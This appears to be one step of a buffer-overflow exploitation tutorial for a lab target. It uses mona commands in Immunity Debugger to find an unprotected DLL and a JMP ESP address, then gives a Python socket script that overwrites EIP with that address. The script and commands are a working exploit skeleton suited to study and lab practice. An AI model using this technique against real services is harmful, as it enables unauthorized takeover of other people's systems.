To find the right module we gotta use mona, the command we need is
`!mona modules`
that should list all the modules and if they have security, you wanna choose the one without security where  all six are false and see the dll for it. 

Example if the dll is essfunc.dll
`!mona find -s "\xff\xe4" -m essfunc.dll`
That should list some more things, pick one of the options and you see an address to the left of it. Example 625011AF, note that somewhere and now in the script type that backwards like below

```python
import socket

ip, port = "10.10.10.10", 9999 # Change the ip and port
offset = 0  # change this with what you got from step 2
prefix = b"" # change this if necessary and make sure theres a space at the end.
module = b"\xaf\x11\x50\x62" # Change this


try:
	s = socket.socket()
	s.connect((ip, port))
	s.send(prefix + b"A"*offset + module)
except:
	print(f"Something went wrong")

s.close()
```

To test if the module worked we gotta put an breakpoint at that address in Immunity debugger and run it.

To put a breakpoint go to immunity debugger and restart the program and run it, now press at top left window at anywhere and press ctrl+g. that should bring a promt asking "Enter expression to follow" and type the address you had before, in my example 625011AF, that should bring you to it and now press f2 on keyboard to put a breakpoint, now run the script above and see what the EIP is, if the EIP is your address which in my case is 625011AF then the module works, if not pick another one with the previous find command and try that.
